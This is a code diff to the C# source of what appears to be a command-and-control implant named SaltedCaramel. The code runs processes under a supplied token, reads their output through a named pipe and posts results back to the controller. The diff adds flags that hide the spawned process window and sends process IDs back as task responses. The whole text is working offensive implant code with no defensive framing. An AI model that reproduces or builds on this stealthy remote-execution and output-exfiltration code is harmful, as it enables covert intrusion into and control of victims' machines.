@@ -51,7 +51,8 @@ namespace SaltedCaramel
                     // Set process to use named pipe for input/output
                     startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                     startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
-                    startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES;
+                    startupInfo.dwFlags = (uint)Win32.STARTF.STARTF_USESTDHANDLES | (uint)Win32.STARTF.STARTF_USESHOWWINDOW;
+                    startupInfo.wShowWindow = 0;
                 }
                 else
                 {
@@ -68,9 +69,9 @@ namespace SaltedCaramel
                 if (createProcess)
                 {
                     Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
-
+                    SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
+                    implant.PostResponse(procStatus);
                     Process proc = Process.GetProcessById(newProc.dwProcessId);
-                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Got process handle for " + newProc.dwProcessId);
 
                     // Trying to continuously read output while the process is running.
                     using (StreamReader reader = new StreamReader(pipeServer))
@@ -81,7 +82,7 @@ namespace SaltedCaramel
                             message = reader.ReadLine();
                             if (message != "")
                             {
-                                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
+                                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(message));
                                 implant.PostResponse(response);
                             }
                         }
@@ -89,7 +90,7 @@ namespace SaltedCaramel
                         message = reader.ReadToEnd();
                         if (message != "")
                         {
-                            SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(message), task.id);
+                            SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(message));
                             implant.PostResponse(response);
                         }
                     }
@@ -145,7 +146,7 @@ namespace SaltedCaramel
                 // TODO: fix the need for this
                 procOutput = procOutput.TrimEnd();
                 proc.WaitForExit();
-                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(procOutput), task.id);
+                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
                 implant.PostResponse(response);
                 implant.SendComplete(task.id);
             }
